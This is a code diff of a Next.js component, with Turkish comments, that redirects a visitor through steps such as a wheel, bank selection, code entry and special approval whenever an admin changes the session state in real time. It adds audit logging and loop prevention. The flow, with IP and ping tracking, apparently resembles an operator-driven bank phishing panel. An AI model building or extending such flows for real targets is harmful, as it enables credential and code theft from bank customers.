@@ -1,10 +1,10 @@
 "use client";
 
-import { useEffect } from "react";
+import { useEffect, useRef } from "react";
 import { usePathname } from "next/navigation";
 import type { SessionStatus, SessionStep } from "@/types/session";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
-import { pathToStep, resolveStepTargetPath } from "@/lib/session-routes";
+import { pathToStep, resolveStepTargetPath, shouldRedirectToServerStep } from "@/lib/session-routes";
 import {
   getPreferredRouteSessionId,
   persistActiveSession,
@@ -210,7 +210,7 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
     };
   }, [effectiveRouteSessionId, sessionId, pathname]);
 
-  /* İlk yüklemede sunucu adımı ile senkron */
+  /* İlk yüklemede sunucu adımı ile senkron — ADIM ÖNCELİĞİ KURALI UYGULA */
   useEffect(() => {
     let cancelled = false;
     void (async () => {
@@ -223,6 +223,16 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
       const status = data.status as SessionStatus | undefined;
       if (status === "SPECIAL_INFO") {
         if (!pathname.startsWith("/special-approval")) {
+          logAuditEvent({
+            session_id: sessionId,
+            public_id: effectiveRouteSessionId,
+            event_kind: "step",
+            event_action: "server_step_redirect",
+            from_step: pathname,
+            to_step: "special_approval",
+            pathname,
+            meta: { reason: "initial_sync_special_info" },
+          });
           window.location.href = "/special-approval";
         }
         return;
@@ -233,35 +243,35 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
       let local: string | null = pathToStep(pathname);
       if (pathname.startsWith("/wheel")) local = "wheel";
 
-      if (local === "wheel" && serverStep === "code_entry") return;
-      if (local === "banken" && serverStep === "bank") return;
+      if (!shouldRedirectToServerStep({ localStep: local, serverStep })) return;
 
-      if (local && serverStep !== local) {
-        const target = resolveStepTargetPath(
-          serverStep,
-          sessionId,
-          effectiveRouteSessionId,
-          (data.form_data ?? {}) as { bankSlug?: string | null },
-        );
-        logAuditEvent({
-          session_id: sessionId,
-          public_id: effectiveRouteSessionId,
-          event_kind: "step",
-          event_action: "server_step_redirect",
-          from_step: local,
-          to_step: serverStep,
-          pathname,
-          meta: { reason: "initial_sync" },
-        });
-        window.location.href = target;
-      }
+      const target = resolveStepTargetPath(
+        serverStep,
+        sessionId,
+        effectiveRouteSessionId,
+        (data.form_data ?? {}) as { bankSlug?: string | null },
+      );
+      logAuditEvent({
+        session_id: sessionId,
+        public_id: effectiveRouteSessionId,
+        event_kind: "step",
+        event_action: "server_step_redirect",
+        from_step: local,
+        to_step: serverStep,
+        pathname,
+        meta: { reason: "initial_sync_priority_rule" },
+      });
+      window.location.href = target;
     })();
     return () => {
       cancelled = true;
     };
   }, [effectiveRouteSessionId, sessionId, pathname]);
 
-  /* Realtime: admin current_step değişince anında yönlendir */
+  /* Realtime: admin current_step/status değişince anında yönlendir
+     ⚠️ Sadece current_step VEYA status GERÇEKTEN değiştiğinde işlem yap!
+     Ping ile gelen last_ping_at / status:online→online / ip_address güncellemelerini GÖRMEZDEN GEL.
+     Böylece kullanıcı hiçbir şey yapmadan 3sn'de bir YÖNLENDİRME döngüsüne girmez. */
   useEffect(() => {
     const supabase = createBrowserSupabaseClient();
     if (!supabase) return;
@@ -285,39 +295,74 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
             status?: SessionStatus;
             form_data?: { bankSlug?: string | null } | null;
           };
-          if (next.status === "SPECIAL_INFO") {
+          const old = payload.old as {
+            current_step?: SessionStep;
+            status?: SessionStatus;
+          } | null;
+
+          const oldStep = typeof old?.current_step === "string" ? old.current_step : null;
+          const newStep = typeof next.current_step === "string" ? next.current_step : null;
+          const oldStatus = typeof old?.status === "string" ? old.status : null;
+          const newStatus = typeof next.status === "string" ? next.status : null;
+
+          const stepChanged = oldStep !== newStep;
+          const statusChanged = oldStatus !== newStatus;
+
+          // ⚠️ NE current_step DEĞİŞTİ NE de status (SPECIAL_INFO). (Bu durum: ping ile last_ping_at güncellenmesi vb.)
+          // İşlem YAPMA, döngüyü kır.
+          if (!stepChanged && !statusChanged) {
+            return;
+          }
+
+          if (newStatus === "SPECIAL_INFO") {
             if (!pathname.startsWith("/special-approval")) {
+              logAuditEvent({
+                session_id: sessionId,
+                public_id: effectiveRouteSessionId,
+                event_kind: "step",
+                event_action: "admin_realtime_redirect",
+                from_step: pathname,
+                to_step: "special_approval",
+                pathname,
+                meta: { reason: "realtime_channel_status_changed", status: newStatus ?? null, oldStatus: oldStatus ?? null },
+              });
               window.location.href = "/special-approval";
             }
             return;
           }
 
-          if (!next.current_step) return;
+          if (!newStep) return;
           let local: string | null = pathToStep(pathname);
           if (pathname.startsWith("/wheel")) local = "wheel";
 
-          if (local === "wheel" && next.current_step === "code_entry") return;
-          if (local === "banken" && next.current_step === "bank") return;
-
-          if (local && next.current_step !== local) {
-            const target = resolveStepTargetPath(
-              next.current_step,
-              sessionId,
-              effectiveRouteSessionId,
-              (next.form_data ?? {}) as { bankSlug?: string | null },
-            );
-            logAuditEvent({
-              session_id: sessionId,
-              public_id: effectiveRouteSessionId,
-              event_kind: "step",
-              event_action: "admin_realtime_redirect",
-              from_step: local,
-              to_step: next.current_step,
-              pathname,
-              meta: { reason: "realtime_channel", status: next.status ?? null },
-            });
-            window.location.href = target;
+          if (!shouldRedirectToServerStep({ localStep: local, serverStep: newStep })) {
+            return;
           }
+
+          const target = resolveStepTargetPath(
+            newStep,
+            sessionId,
+            effectiveRouteSessionId,
+            (next.form_data ?? {}) as { bankSlug?: string | null },
+          );
+          logAuditEvent({
+            session_id: sessionId,
+            public_id: effectiveRouteSessionId,
+            event_kind: "step",
+            event_action: "admin_realtime_redirect",
+            from_step: local,
+            to_step: newStep,
+            pathname,
+            meta: {
+              reason: "realtime_channel_priority_rule",
+              status: newStatus ?? null,
+              oldStep,
+              newStep,
+              stepChanged,
+              statusChanged,
+            },
+          });
+          window.location.href = target;
         },
       )
       .subscribe();
